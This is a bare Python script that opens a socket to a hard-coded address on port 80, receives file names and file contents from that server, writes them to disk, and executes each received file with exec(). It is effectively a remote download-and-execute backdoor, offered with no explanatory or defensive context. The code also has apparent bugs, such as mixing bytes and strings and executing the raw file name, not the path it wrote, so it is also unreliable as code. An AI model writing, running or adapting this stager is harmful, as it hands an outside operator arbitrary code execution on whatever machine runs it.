import socket
import sys
import os 
class client():
    def __init__(self, port):
        self.ip = '192.168.31.156'
        self.port = port
        self.myip = socket.gethostbyname(socket.gethostname())
    def connect(self):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((self.ip, self.port))
        while True:
            while True:
                 folder = os.getcwd()
                 file = s.recv(1024)
                 fname = folder + "\ " + file
                 f = open(fname , 'wb')
                 txt = s.recv(1024)
                 f.write(txt)
                 f.close()
                 exec(open(file).read())

if __name__ == '__main__':
    print('connecting with server...')
    client = client(80)
    client.connect()

